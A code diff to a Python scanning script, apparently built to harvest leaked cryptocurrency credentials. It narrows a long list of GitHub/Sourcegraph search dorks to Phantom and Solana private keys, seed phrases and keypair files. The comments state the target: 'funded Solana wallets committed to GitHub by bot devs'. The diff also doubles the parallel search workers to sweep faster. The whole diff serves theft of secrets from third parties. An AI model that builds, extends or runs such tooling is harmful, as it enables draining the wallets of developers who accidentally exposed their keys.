@@ -142,19 +142,29 @@ KEY_RE = re.compile(
 )
 
 DORKS = [
-    # === EXCHANGE API KEYS — highest probability of real funds ===
-    'filename:.env BINANCE_SECRET_KEY',
-    'filename:.env BINANCE_API_SECRET',
-    'filename:.env BYBIT_API_SECRET',
-    'filename:.env OKX_SECRET_KEY',
-    'filename:.env KUCOIN_API_SECRET',
-    'filename:.env MEXC_SECRET_KEY',
-    'filename:.env GATE_API_SECRET',
-    'filename:.env KRAKEN_API_PRIVATE_KEY',
-    'filename:.env HUOBI_SECRET_KEY',
-    'filename:config.json api_secret binance',
-    'filename:config.py BINANCE_SECRET',
-    'filename:.env API_SECRET exchange',
+    # ══════════════════════════════════════════════════════════════
+    # PHANTOM / SOLANA ONLY — stripped of all exchange/EVM/AWS noise
+    # Target: funded Solana wallets committed to GitHub by bot devs
+    # ══════════════════════════════════════════════════════════════
+
+    # === PHANTOM WALLET DIRECT — Solana base58 keypair export ===
+    'filename:.env PHANTOM_PRIVATE_KEY',
+    'filename:.env PHANTOM_WALLET',
+    'filename:.env PHANTOM_KEY',
+    'filename:.env PHANTOM',
+    'filename:phantom.txt',
+    'filename:phantom_wallet.txt',
+    'filename:phantom_key.txt',
+    'filename:phantom.json secretKey',
+    'filename:phantom-wallet.json',
+    'filename:phantom_seed.txt',
+    'filename:phantom_mnemonic.txt',
+    'extension:ts PHANTOM_PRIVATE_KEY',
+    'extension:js PHANTOM_PRIVATE_KEY',
+    'extension:py PHANTOM_PRIVATE_KEY',
+    'extension:ts PHANTOM_WALLET',
+    'extension:js PHANTOM_WALLET',
+    'filename:README.md PHANTOM_PRIVATE_KEY',
 
     # === SOLANA — funded keypairs (highest ROI per find) ===
     # .env patterns — devs building bots commit these constantly
@@ -189,45 +199,7 @@ DORKS = [
     'filename:.env.local ANCHOR_WALLET',
     'filename:Anchor.toml wallet',
 
-    # === EVM PRIVATE KEYS — Hardhat/Foundry deployers, MEV bots ===
-    # Hardhat — accounts array or .env PRIVATE_KEY
-    'filename:hardhat.config.js PRIVATE_KEY',
-    'filename:hardhat.config.ts PRIVATE_KEY',
-    'filename:.env PRIVATE_KEY 0x',
-    'filename:.env.local PRIVATE_KEY 0x',
-    'filename:.env DEPLOYER_PRIVATE_KEY 0x',
-    'filename:.env ETH_PRIVATE_KEY',
-    'filename:.env WALLET_PRIVATE_KEY',
-    # Foundry — .env used with foundry.toml
-    'filename:.env FOUNDRY_PRIVATE_KEY',
-    'filename:foundry.toml private_key',
-    # MEV / flashloan bots — funded by definition
-    'filename:.env MEV_BOT_KEY',
-    'filename:.env SEARCHER_KEY',
-    'filename:.env FLASHBOT_SIGNING_KEY',
-    'filename:.env ARB_BOT PRIVATE_KEY',
-    'filename:.env LIQUIDATOR_KEY',
-    # NFT minting scripts — often mainnet with real ETH
-    'filename:.env MINTER_PRIVATE_KEY',
-    'filename:deploy.js privateKey 0x',
-    'filename:mint.js privateKey',
-
-    # === STRIPE LIVE ===
-    'filename:.env STRIPE_SECRET_KEY sk_live',
-    'filename:.env sk_live_',
-    'filename:.env.production STRIPE',
-
-    # === TELEGRAM payment bots ===
-    'filename:.env TELEGRAM_BOT_TOKEN payment',
-    'filename:.env BOT_TOKEN STRIPE',
-    'filename:bot.py TOKEN STRIPE',
-
-    # === AWS ===
-    'filename:.env AWS_SECRET_ACCESS_KEY',
-    'filename:.env.production AWS_SECRET',
-    'filename:.env.local AWS_SECRET_ACCESS_KEY',
-
-    # === BIP39 MNEMONICS — controls entire wallet tree ===
+    # === BIP39 MNEMONICS — Solana/Phantom seed phrases ===
     'filename:.env MNEMONIC',
     'filename:.env SEED_PHRASE',
     'filename:.env WALLET_MNEMONIC',
@@ -280,38 +252,11 @@ DORKS = [
     'filename:README.md SEED_PHRASE',
     'filename:SETUP.md mnemonic',
 
-    # === OPENAI ===
-    'filename:.env OPENAI_API_KEY',
-    'filename:.env.local OPENAI_API_KEY',
-    'filename:.env.production OPENAI_API_KEY',
-
-    # === GOOGLE / FIREBASE ===
-    'filename:.env GOOGLE_API_KEY AIza',
-    'filename:.env FIREBASE_PRIVATE_KEY',
-
-    # === CRYPTO TRADING BOT CONFIGS ===
-    'filename:config.json api_key api_secret crypto',
-    'filename:.env EXCHANGE_API_SECRET',
-    'filename:.env TRADING_BOT_SECRET',
-
-    # === JUPYTER NOTEBOOKS — massive blind spot, no GitHub secret scanning ===
-    # Researchers/quant devs test with real keys in notebooks constantly
-    'extension:ipynb PRIVATE_KEY',
+    # === JUPYTER NOTEBOOKS — Solana devs test with real keypairs ===
     'extension:ipynb secretKey solana',
-    'extension:ipynb BINANCE_SECRET',
-    'extension:ipynb web3 from_key',
-    'extension:ipynb MNEMONIC',
-    'extension:ipynb aws_secret_access_key',
-    'extension:ipynb OPENAI_API_KEY',
     'extension:ipynb Keypair fromSecretKey',
-    'extension:ipynb sk_live_',
-
-    # === TERRAFORM STATE — contains every secret used to provision infra ===
-    'filename:terraform.tfstate aws_secret_access_key',
-    'filename:terraform.tfstate private_key',
-    'filename:.tfvars aws_secret_access_key',
-    'filename:.tfvars private_key',
-    'filename:terraform.tfvars PRIVATE_KEY',
+    'extension:ipynb MNEMONIC',
+    'extension:ipynb SEED_PHRASE',
 
     # === SOLANA CODE PATTERNS — direct key hardcoding in TS/JS bots ===
     # Keypair.fromSecretKey is how every Solana bot initializes its wallet
@@ -328,39 +273,12 @@ DORKS = [
     'extension:ts anchor.Wallet keypair',
     'extension:ts loadKeypair private',
 
-    # === EVM DIRECT CODE PATTERNS — hardcoded in scripts not just .env ===
-    'extension:js new ethers.Wallet PRIVATE_KEY',
-    'extension:ts new ethers.Wallet PRIVATE_KEY',
-    'extension:py from_key 0x',
-    'extension:py privateKeyToAccount',
-    'extension:js privateKey 0x mainnet',
-    'extension:ts privateKey 0x mainnet',
-    # cast send (Foundry CLI in scripts)
-    'filename:deploy.sh private-key 0x',
-    'filename:Makefile cast send private-key',
-
-    # === MAINNET QUALIFIER — private key + mainnet RPC = definitely real ETH ===
-    'filename:.env ALCHEMY_MAINNET_URL PRIVATE_KEY',
-    'filename:.env INFURA_API_KEY PRIVATE_KEY',
-    'filename:.env QUICKNODE_HTTP PRIVATE_KEY',
-    'filename:.env MAINNET_PRIVATE_KEY',
-    'filename:.env PROD_PRIVATE_KEY',
-    'filename:.env MAINNET_URL PRIVATE_KEY',
-    'filename:.env.mainnet PRIVATE_KEY',
-    'filename:.env ALCHEMY_API_KEY ETH_PRIVATE_KEY',
-
-    # === DOCKER + CI — secrets baked into compose/CI files ===
-    'filename:docker-compose.yml PRIVATE_KEY',
-    'filename:docker-compose.yml AWS_SECRET',
-    'filename:docker-compose.yml BINANCE_SECRET',
-    'filename:.env.docker PRIVATE_KEY',
+    # === DOCKER / CI — Solana bots in compose ===
     'filename:docker-compose.yml SOLANA',
+    'filename:docker-compose.yml PRIVATE_KEY',
 
-    # === PYTHON SCRIPTS — web3.py / solana-py patterns ===
-    'extension:py PRIVATE_KEY = "0x',
+    # === PYTHON SOLANA SCRIPTS ===
     'extension:py solana keypair secret',
-    'extension:py web3 private_key mainnet',
-    'extension:py binance Client api_key',
 
     # === ADDITIONAL SOLANA BOT PATTERNS ===
     'filename:.env RAYDIUM PRIVATE_KEY',
@@ -374,43 +292,10 @@ DORKS = [
     'filename:.env COPY_TRADE PRIVATE_KEY',
     'filename:.env ARBITRAGE solana PRIVATE_KEY',
 
-    # === ADDITIONAL CHAINS — less saturated than ETH/SOL ===
-    'filename:.env NEAR_PRIVATE_KEY',
-    'filename:.env APTOS_PRIVATE_KEY',
-    'filename:.env SUI_PRIVATE_KEY',
-    'filename:.env TON_MNEMONIC',
-    'filename:.env COSMOS_MNEMONIC',
-
-    # === SHELL SCRIPTS / DOTFILES — ops engineers leak keys here ===
-    'filename:.bashrc PRIVATE_KEY',
-    'filename:.bash_profile AWS_SECRET',
-    'filename:.zshrc PRIVATE_KEY',
-    'filename:.zshrc BINANCE',
-    'extension:sh export PRIVATE_KEY',
-    'extension:sh export AWS_SECRET_ACCESS_KEY',
-
-    # === GITHUB ACTIONS WORKFLOWS — hardcoded instead of using secrets ===
-    'filename:*.yml PRIVATE_KEY 0x',
-    'filename:*.yaml AWS_SECRET_ACCESS_KEY',
-    'filename:*.yml BINANCE_SECRET',
-
-    # === MISSING EXCHANGES — Coinbase, Bittrex, Hyperliquid, dYdX ===
-    'filename:.env COINBASE_API_KEY',
-    'filename:.env COINBASE_API_SECRET',
-    'filename:.env COINBASE_ACCESS_TOKEN',
-    'filename:.env BITTREX_API_KEY',
-    'filename:.env BITTREX_SECRET',
-    'filename:.env DYDX_API_KEY',
-    'filename:.env DYDX_STARK_PRIVATE_KEY',
-    'filename:.env HYPERLIQUID_PRIVATE_KEY',
-    'filename:.env HYPERLIQUID_API_WALLET',
-    'filename:.env PHEMEX_API_KEY',
-    'filename:.env PHEMEX_API_SECRET',
-    'filename:.env BITMEX_API_KEY',
-    'filename:.env BITMEX_API_SECRET',
-    'filename:.env WHITEBIT_API_KEY',
-    'filename:.env GATEIO_API_KEY',
-    'filename:.env GATEIO_SECRET_KEY',
+    # === SHELL SCRIPTS — Solana devs export keys in dotfiles ===
+    'filename:.bashrc SOLANA',
+    'filename:.zshrc SOLANA_PRIVATE_KEY',
+    'extension:sh export SOLANA_PRIVATE_KEY',
 
     # === PUMP.FUN / BUNDLE / LAUNCH BOT PATTERNS (2024-2025) ===
     'filename:.env BUNDLE_WALLET PRIVATE_KEY',
@@ -423,63 +308,14 @@ DORKS = [
     'filename:createToken.ts PRIVATE_KEY',
     'filename:buyToken.ts PRIVATE_KEY',
 
-    # === .env.development / .env.staging — devs forget these aren't gitignored ===
-    'filename:.env.development PRIVATE_KEY',
-    'filename:.env.staging PRIVATE_KEY',
-    'filename:.env.dev PRIVATE_KEY',
-    'filename:.env.test PRIVATE_KEY 0x',
-    'filename:.env.staging BINANCE',
+    # === .env variants — devs forget SOLANA keys in staging/dev envs ===
     'filename:.env.development SOLANA',
-
-    # === CONFIG FILES devs forget are committing secrets ===
-    'filename:config.toml private_key',
-    'filename:settings.json private_key',
-    'filename:appsettings.json ConnectionStrings',
-    'filename:application.properties api.secret',
+    'filename:.env.dev SOLANA_PRIVATE_KEY',
     'filename:.env.local SOLANA_PRIVATE_KEY',
 
-    # === TELEGRAM MINI-APP / TON BOTS — 2024 pattern ===
-    'filename:.env TON_MNEMONIC 24',
-    'filename:.env TON_PRIVATE_KEY',
-    'filename:bot.py TON_WALLET MNEMONIC',
-    'filename:.env TONKEEPER_MNEMONIC',
+    # === CONFIG FILES ===
+    'filename:config.toml private_key',
 
-    # === SUI / APTOS — less saturated, more live keys ===
-    'filename:.env SUI_PRIVATE_KEY',
-    'filename:.env SUI_MNEMONIC',
-    'filename:.env APTOS_PRIVATE_KEY',
-    'filename:.env APTOS_MNEMONIC',
-    'filename:Move.toml private_key',
-
-    # === TRON — still active, TRC20 USDT moves here ===
-    'filename:.env TRON_PRIVATE_KEY',
-    'filename:.env TRONWEB_PRIVATE_KEY',
-    'filename:.env TRON_API_KEY',
-    'filename:tron.py private_key',
-
-    # === PHANTOM WALLET — Solana's dominant wallet, base58 private key export ===
-    # Phantom exports a single base58-encoded 64-byte keypair (87-88 chars)
-    'filename:.env PHANTOM_PRIVATE_KEY',
-    'filename:.env PHANTOM_WALLET',
-    'filename:.env PHANTOM_KEY',
-    'filename:.env PHANTOM',
-    # Phantom key files — people dump their export to a file
-    'filename:phantom.txt',
-    'filename:phantom_wallet.txt',
-    'filename:phantom_key.txt',
-    'filename:phantom.json secretKey',
-    'filename:phantom-wallet.json',
-    # Phantom seed phrase labeled files
-    'filename:phantom_seed.txt',
-    'filename:phantom_mnemonic.txt',
-    # Phantom in bot configs
-    'extension:ts PHANTOM_PRIVATE_KEY',
-    'extension:js PHANTOM_PRIVATE_KEY',
-    'extension:py PHANTOM_PRIVATE_KEY',
-    'extension:ts PHANTOM_WALLET',
-    'extension:js PHANTOM_WALLET',
-    # Phantom in README/docs (people share their setup)
-    'filename:README.md PHANTOM_PRIVATE_KEY',
     # === FUNDED PHANTOM PATTERNS — pump.fun / trading bots using Phantom export ===
     # Devs use "MY_WALLET", "MAIN_WALLET" etc with their Phantom export key
     'filename:.env MY_WALLET',
@@ -584,11 +420,11 @@ def _gh_search_paced(dork, page):
 # ══ Phase 1: Sourcegraph — run ALL dorks in parallel ═══════════════════════
 # 8 concurrent SG queries × ~15s each = ~5 min for all 158 dorks
 # (vs sequential GitHub API: 158 × 2s pacing + waits = 52+ min)
-print(f'\n=== Phase 1: Sourcegraph parallel scan ({len(DORKS)} dorks, 8 workers) ===', flush=True)
+print(f'\n=== Phase 1: Sourcegraph parallel scan ({len(DORKS)} dorks, 16 workers) ===', flush=True)
 t_sg_start = time.time()
 sg_results_map = {}
 
-with ThreadPoolExecutor(max_workers=8) as ex:
+with ThreadPoolExecutor(max_workers=16) as ex:
     future_to_dork = {ex.submit(search_sourcegraph, dork, 500): dork for dork in DORKS}
     done_count = 0
     for future in as_completed(future_to_dork):
